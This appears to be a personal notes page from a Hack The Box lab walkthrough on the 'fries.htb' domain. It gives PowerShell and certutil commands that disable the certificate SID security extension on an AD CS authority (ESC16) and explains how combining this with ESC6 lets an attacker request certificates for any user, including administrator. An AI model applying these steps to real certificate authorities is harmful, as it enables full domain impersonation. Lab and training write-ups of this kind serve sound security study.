Principle: Disables verification of certain certificate extensions, notably the *szOID_NTDS_CA_SECURITY_EXT* extension that validates the SID in the certificate.

#WinRM_Shell 

```Powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$CA.SetConfigEntry("DC01.fries.htb\fries-DC01-CA", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")

certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
```

![[DisableExtensionList.png]]

Excellent! The *DisableExtensionList* is **already set correctly**! 

Now Complete the ESC6 Exploitation, since both requirements are met:

- ✅ `EDITF_ATTRIBUTESUBJECTALTNAME2` is enabled (from earlier)
- ✅ `DisableExtensionList` is set to `1.3.6.1.4.1.311.25.2`

You can now proceed with the attack.

Why these two misconfigurations?

- ESC6 allows specifying an arbitrary UPN (e.g., [administrator@fries.htb](mailto:administrator@fries.htb)) in the certificate
- ESC16 prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.

**Next step:** [[ESC6 + ESC16 Exploitation]]
